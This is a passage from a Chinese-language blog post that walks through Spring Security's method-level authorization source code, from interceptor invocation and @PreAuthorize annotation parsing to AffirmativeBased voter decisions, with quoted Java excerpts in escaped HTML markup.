&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">finallyInvocation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>会保证自定义过滤器全部执行完毕以后，再把 copy source 「归还」到上下文中。这样，在后续的业务处理中就不用担心获取到一个不安全地 Authentication 对象了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">Authentication authenticated &lt;span style="color:#f92672">=&lt;/span> authenticateIfRequired&lt;span style="color:#f92672">();&lt;/span>
Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> attributes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">obtainSecurityMetadataSource&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAttributes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>object&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// Attempt authorization
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">accessDecisionManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">decide&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authenticated&lt;span style="color:#f92672">,&lt;/span> object&lt;span style="color:#f92672">,&lt;/span> attributes&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AccessDeniedException accessDeniedException&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
publishEvent&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> AuthorizationFailureEvent&lt;span style="color:#f92672">(&lt;/span>object&lt;span style="color:#f92672">,&lt;/span> attributes&lt;span style="color:#f92672">,&lt;/span> authenticated&lt;span style="color:#f92672">,&lt;/span>
accessDeniedException&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> accessDeniedException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// Attempt to run as a different user
&lt;/span>&lt;span style="color:#75715e">&lt;/span>Authentication runAs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">runAsManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">buildRunAs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authenticated&lt;span style="color:#f92672">,&lt;/span> object&lt;span style="color:#f92672">,&lt;/span>
attributes&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>runAs &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>debug&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;RunAsManager did not change Authentication object&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// no further work post-invocation
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InterceptorStatusToken&lt;span style="color:#f92672">(&lt;/span>SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
attributes&lt;span style="color:#f92672">,&lt;/span> object&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>debug&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Switching to RunAs Authentication: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> runAs&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
SecurityContext origCtx &lt;span style="color:#f92672">=&lt;/span> SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createEmptyContext&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">setAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>runAs&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// need to revert to token.Authenticated post-invocation
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InterceptorStatusToken&lt;span style="color:#f92672">(&lt;/span>origCtx&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">,&lt;/span> attributes&lt;span style="color:#f92672">,&lt;/span> object&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="prepostannotationsecuritymetadatasourcegetattributes">PrePostAnnotationSecurityMetadataSource.getAttributes&lt;/h2>
&lt;p>在 security 中使用的几种鉴权注解一共有以下四种：&lt;/p>
&lt;ul>
&lt;li>PreFilter&lt;/li>
&lt;li>PreAuthorize&lt;/li>
&lt;li>PostFilter&lt;/li>
&lt;li>PostAuthorize&lt;/li>
&lt;/ul>
&lt;p>其中最常用的是 PreAuthorize，它的含义是在执行目标方法前执行鉴权逻辑。前置过滤器执行的第一个逻辑，就是使用 getAttributes 方法获取目标方法上的注解。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> attributes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">obtainSecurityMetadataSource&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAttributes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>object&lt;span style="color:#f92672">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">getAttributes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Method method&lt;span style="color:#f92672">,&lt;/span> Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> targetClass&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDeclaringClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> Object&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> Collections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">emptyList&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">trace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Looking for Pre/Post annotations for method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> method&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on target class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> targetClass &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
PreFilter preFilter &lt;span style="color:#f92672">=&lt;/span> findAnnotation&lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">,&lt;/span> targetClass&lt;span style="color:#f92672">,&lt;/span> PreFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
PreAuthorize preAuthorize &lt;span style="color:#f92672">=&lt;/span> findAnnotation&lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">,&lt;/span> targetClass&lt;span style="color:#f92672">,&lt;/span>
PreAuthorize&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
PostFilter postFilter &lt;span style="color:#f92672">=&lt;/span> findAnnotation&lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">,&lt;/span> targetClass&lt;span style="color:#f92672">,&lt;/span> PostFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// TODO: Can we check for void methods and throw an exception here?
&lt;/span>&lt;span style="color:#75715e">&lt;/span> PostAuthorize postAuthorize &lt;span style="color:#f92672">=&lt;/span> findAnnotation&lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">,&lt;/span> targetClass&lt;span style="color:#f92672">,&lt;/span>
PostAuthorize&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>preFilter &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> preAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> postFilter &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> postAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// There is no meta-data so return
&lt;/span>&lt;span style="color:#75715e">&lt;/span> logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">trace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;No expression annotations found&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> Collections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">emptyList&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
String preFilterAttribute &lt;span style="color:#f92672">=&lt;/span> preFilter &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> preFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String filterObject &lt;span style="color:#f92672">=&lt;/span> preFilter &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> preFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">filterTarget&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String preAuthorizeAttribute &lt;span style="color:#f92672">=&lt;/span> preAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> preAuthorize&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String postFilterAttribute &lt;span style="color:#f92672">=&lt;/span> postFilter &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> postFilter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String postAuthorizeAttribute &lt;span style="color:#f92672">=&lt;/span> postAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> postAuthorize
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> attrs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;(&lt;/span>2&lt;span style="color:#f92672">);&lt;/span>
PreInvocationAttribute pre &lt;span style="color:#f92672">=&lt;/span> attributeFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createPreInvocationAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
preFilterAttribute&lt;span style="color:#f92672">,&lt;/span> filterObject&lt;span style="color:#f92672">,&lt;/span> preAuthorizeAttribute&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>pre &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
attrs&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>pre&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
PostInvocationAttribute post &lt;span style="color:#f92672">=&lt;/span> attributeFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createPostInvocationAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
postFilterAttribute&lt;span style="color:#f92672">,&lt;/span> postAuthorizeAttribute&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>post &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
attrs&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>post&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
attrs&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">trimToSize&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> attrs&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当通过 getAttributes 获取到对应的鉴权注解后，通过 createPreInvocationAttribute 将注解的 value——一般是 el 表达式，解析成 Express 对象后封装起来等待后续取用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">String preAuthorizeAttribute &lt;span style="color:#f92672">=&lt;/span> preAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> preAuthorize&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
PreInvocationAttribute pre &lt;span style="color:#f92672">=&lt;/span> attributeFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createPreInvocationAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
preFilterAttribute&lt;span style="color:#f92672">,&lt;/span> filterObject&lt;span style="color:#f92672">,&lt;/span> preAuthorizeAttribute&lt;span style="color:#f92672">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> PreInvocationAttribute &lt;span style="color:#a6e22e">createPreInvocationAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String preFilterAttribute&lt;span style="color:#f92672">,&lt;/span>
String filterObject&lt;span style="color:#f92672">,&lt;/span> String preAuthorizeAttribute&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// TODO: Optimization of permitAll
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ExpressionParser parser &lt;span style="color:#f92672">=&lt;/span> getParser&lt;span style="color:#f92672">();&lt;/span>
Expression preAuthorizeExpression &lt;span style="color:#f92672">=&lt;/span> preAuthorizeAttribute &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> parser
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">parseExpression&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;permitAll&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parser
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">parseExpression&lt;/span>&lt;span style="color:#f92672">(&lt;/span>preAuthorizeAttribute&lt;span style="color:#f92672">);&lt;/span>
Expression preFilterExpression &lt;span style="color:#f92672">=&lt;/span> preFilterAttribute &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parser
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">parseExpression&lt;/span>&lt;span style="color:#f92672">(&lt;/span>preFilterAttribute&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PreInvocationExpressionAttribute&lt;span style="color:#f92672">(&lt;/span>preFilterExpression&lt;span style="color:#f92672">,&lt;/span>
filterObject&lt;span style="color:#f92672">,&lt;/span> preAuthorizeExpression&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ParseException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Failed to parse expression &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getExpressionString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> e&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="accessdecisionmanagerdecide---affirmativebaseddecide">AccessDecisionManager.decide -&amp;gt; AffirmativeBased.decide&lt;/h2>
&lt;p>说完了 getAttribute，让我们回到 beforeInvocation 方法的后续处理。你可能已经猜到了，和身份认证一样 filter 是不会实现实际的权限验证逻辑的。权限验证被交给了过滤器关联的 AccessDecisionManage.decide 方法来决定。&lt;/p>
&lt;p>AccessDecisionManager 是一个接口，它的实现一共有 3 个类。AbstractAccessDecisionManager 是实现接口的抽象类，提供模板方法的定义。AffirmativeBased、ConsensusBased、UnanimousBased 是三个继承 AbstractAccessDecisionManager 的子类实现，分别代表了三种不同的记分策略。&lt;/p>
&lt;p>以 AffirmativeBased 作为代表来说明的话，主要内容就是把 authentication 与封装的鉴权注解 el 表达式传递给关联的成员 decisionVoters 的 vote 方法进行处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">decide&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Authentication authentication&lt;span style="color:#f92672">,&lt;/span> Object object&lt;span style="color:#f92672">,&lt;/span>
Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> configAttributes&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> AccessDeniedException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> deny &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AccessDecisionVoter voter &lt;span style="color:#f92672">:&lt;/span> getDecisionVoters&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> voter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">vote&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">,&lt;/span> object&lt;span style="color:#f92672">,&lt;/span> configAttributes&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Voter: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> voter &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;, returned: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> result&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">switch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>result&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">case&lt;/span> AccessDecisionVoter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ACCESS_GRANTED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">case&lt;/span> AccessDecisionVoter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ACCESS_DENIED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
deny&lt;span style="color:#f92672">++;&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
default:
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>deny &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AccessDeniedException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AbstractAccessDecisionManager.accessDenied&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Access is denied&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// To get this far, every AccessDecisionVoter abstained
&lt;/span>&lt;span style="color:#75715e">&lt;/span> checkAllowIfAllAbstainDecisions&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="preinvocationauthorizationadvicevotervote">PreInvocationAuthorizationAdviceVoter.vote&lt;/h2>
&lt;p>和上面的架构设计一样， AccessDecisionVoter 的实现 PreInvocationAuthorizationAdviceVoter.vote 看起来像是要开始处理真正意义上的权限问题了，但是其实依然没到最核心的部分。
vote 方法会返回一个 preAdvice.before 的结果，这个结果会被转换成 ACCESS_GRANTED : ACCESS_DENIED 这两个数字。为什么 preAdvice.before 的调用不直接返回 boolean 类型的鉴权结果？想想之前的 AffirmativeBased.decide 方法的设计思路：根据多个不同的 voter 返回的结果，我们可以使用不同的投票策略来对分数进行判定。返回一个数字，而不是 boolean 更便于计算最终得分。&lt;/p>
